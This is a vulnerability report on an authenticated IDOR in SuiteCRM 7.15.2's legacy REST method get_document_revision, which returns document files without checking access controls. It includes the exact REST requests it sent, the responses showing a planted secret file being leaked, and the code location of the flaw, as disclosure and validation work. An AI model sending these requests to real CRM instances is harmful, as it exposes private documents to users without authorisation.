# VULN-003 — `get_document_revision`: authenticated IDOR, download any document file

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: High (CVSS 3.1 6.5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: see `run.log`

## Preconditions
- Fresh low-priv user `mod_e59288ca` (id `77b75a4b-27f2-4ba0-8a5f-ce1486e74e62`).
- Throwaway Role `45379f4d-4ab5-442c-bf43-ae375ff48393` denying `Documents` `view`+`list`
  (`ACL_ALLOW_NONE`), assigned only to this user (`_c1_common.restrict_role`).
- Victim Document `4e293d47-5214-459a-b4ee-a3e4c37f4494` (admin-owned) + DocumentRevision
  `affb82db-8de0-4a69-a01b-85afc47415ff` created by admin via legacy REST `set_entry` +
  `set_document_revision`, carrying random secret file content
  `CVEHUNTER-SECRET-FILE-doc_53f458f3\n`.
- **Independently verified on disk** (not via any API) inside the app container:
  `base64 -w0 /var/www/html/upload/affb82db-8de0-4a69-a01b-85afc47415ff` decodes to the exact
  planted bytes — confirms the precondition really persisted server-side.

## Request
Both calls use the same fresh low-priv legacy-REST session id.
```
POST /service/v4_1/rest.php
method=get_entry&input_type=JSON&response_type=JSON&
  rest_data=["<low-priv session>","Documents","4e293d47-5214-459a-b4ee-a3e4c37f4494",["id","document_name"],[]]
```
then the decisive request (`request.http`):
```
POST /service/v4_1/rest.php
method=get_document_revision&input_type=JSON&response_type=JSON&
  rest_data=["<low-priv session>","affb82db-8de0-4a69-a01b-85afc47415ff"]
```

## Response
`get_entry()` (ACL'd sibling, control):
```json
{"name": "Access Denied", "number": 40, "description": "You do not have access"}
```
`get_document_revision()` (the vulnerable sink, `response.txt`):
```json
{"document_revision": {"id": "affb82db-...", "document_name": "...", "revision": "1",
  "filename": "secret.txt", "file": "Q1ZFSFVOVEVSLVNFQ1JFVC1GSUxFLWRvY181M2Y0NThmMwo="}}
```
`base64.b64decode(file)` == `b'CVEHUNTER-SECRET-FILE-doc_53f458f3\n'` — the exact planted secret
(saved raw in `evidence/leaked_file.bin`).

## Observation
Matches the static finding exactly: `get_document_revision` (`SugarWebServiceImpl.php:877-905`)
calls `checkSessionAndModuleAccess($session,'invalid_session','','','',$error)` with an **empty**
module (session-only gate), then `$dr->retrieve($id)` and returns file bytes with **no**
`checkACLAccess()` anywhere. Its sibling `get_entry`→`get_entries` (`:138`) correctly calls
`checkACLAccess($seed,'DetailView',...)` and was live-confirmed to deny the same low-priv user
("Access Denied" / "You do not have access") on the parent Document — yet the file behind that
exact Document was fully downloadable through the unguarded getter, in the same session.

## Side effects
- 1 throwaway user, 1 throwaway Role (+2 `acl_roles_actions` rows +1 `acl_roles_users` row),
  1 Document, 1 DocumentRevision (1 file on disk under `upload/`) — all random-suffixed.
- No destructive changes.

## Research & references
CWE-639 (IDOR). OWASP WSTG-ATHZ-04 (Testing for IDOR):
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
